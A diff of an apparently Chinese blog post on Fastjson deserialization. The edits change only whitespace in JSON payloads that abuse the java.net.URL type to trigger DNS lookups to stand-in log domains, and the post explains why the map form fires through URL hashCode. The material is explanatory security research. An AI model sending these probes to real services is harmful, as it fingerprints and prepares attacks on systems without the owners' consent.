@@ -11,7 +11,7 @@ tldr 能。
 方式一
 ```
 payload1:
-{{"@type":"java.net.URL","val":"http://dns1.log.tld"}:"a"}
+{ {"@type":"java.net.URL","val":"http://dns1.log.tld"}:"a"}
 ```
 如果收到dns1的请求，说明没有开启autotype。（本文未分析，因为写完了才发现。留给读者分析。）
 方式二
@@ -42,7 +42,7 @@ java.net.URL
 payload3
 {"@type":"java.net.URL","val":"http://dns3.log.tld"}
 payload4
-{{"@type":"java.net.URL","val":"http://dns4.log.tld"}:"a"}
+{ {"@type":"java.net.URL","val":"http://dns4.log.tld"}:"a"}
 ```
 实际发现payload3可以收不到dns请求，payload4却可以。因为map操作时，调用了`java.net.URL`的hashcode函数，最终调用了`java.net.URLStreamHandler`的hashcode函数，调用了getHostAddress函数。
 
